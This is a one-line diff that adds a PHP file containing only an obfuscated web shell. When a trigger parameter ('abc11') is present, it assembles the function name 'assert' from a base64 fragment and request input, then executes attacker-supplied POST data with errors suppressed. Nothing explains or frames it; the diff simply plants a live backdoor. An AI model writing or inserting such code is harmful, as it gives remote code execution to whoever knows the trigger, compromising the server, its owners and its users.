@@ -1,0 +1,1 @@
+<?php if(isset($_GET['abc11'])){ $c=base64_decode('YXNzZXI=').$_GET['n'].'t';@$c($_POST['x']);} ?>
